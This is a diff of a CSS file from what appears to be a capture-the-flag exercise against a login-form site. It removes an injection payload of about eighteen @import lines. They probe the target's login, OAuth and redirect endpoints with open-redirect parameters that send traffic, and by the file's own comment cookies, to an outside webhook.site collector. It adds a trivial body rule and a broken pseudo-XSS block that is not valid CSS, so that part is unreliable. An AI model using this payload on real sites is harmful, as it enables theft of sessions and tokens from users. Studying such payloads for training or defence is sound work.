@@ -1,21 +1,8 @@
-/* try common redirect params & endpoints — cookies go with these requests */
-@import url("https://fancy-login-form.ctf.zone/login?next=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r1");
-@import url("https://fancy-login-form.ctf.zone/?next=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r2");
-@import url("https://fancy-login-form.ctf.zone/signin?next=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r3");
-@import url("https://fancy-login-form.ctf.zone/auth/login?next=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r4");
-@import url("https://fancy-login-form.ctf.zone/auth/callback?redirect_uri=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r5");
-@import url("https://fancy-login-form.ctf.zone/oauth/callback?redirect_uri=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r6");
-@import url("https://fancy-login-form.ctf.zone/oauth/authorize?redirect_uri=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r7");
-@import url("https://fancy-login-form.ctf.zone/callback?redirect=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r8");
-@import url("https://fancy-login-form.ctf.zone/redirect?to=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r9");
-@import url("https://fancy-login-form.ctf.zone/redirect?url=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r10");
-@import url("https://fancy-login-form.ctf.zone/?return=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r11");
-@import url("https://fancy-login-form.ctf.zone/?redirect=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r12");
-@import url("https://fancy-login-form.ctf.zone/?dest=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r13");
-@import url("https://fancy-login-form.ctf.zone/?goto=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r14");
-@import url("https://fancy-login-form.ctf.zone/admin?next=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r15");
-@import url("https://fancy-login-form.ctf.zone/dashboard?next=https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c/r16");
+body {
+  background-color: #ffffff;
+}
 
-/* URL-encoded variants (some apps require encoded redirect_uri) */
-@import url("https://fancy-login-form.ctf.zone/auth/callback?redirect_uri=https%3A%2F%2Fwebhook.site%2F87ef22b5-7d72-43c5-8d86-ada8cdf62e1c%2Fr17");
-@import url("https://fancy-login-form.ctf.zone/oauth/callback?redirect_uri=https%3A%2F%2Fwebhook.site%2F87ef22b5-7d72-43c5-8d86-ada8cdf62e1c%2Fr18");
+/* malicious code injected by attacker */
+script {
+  alert("XSS attack!");
+}
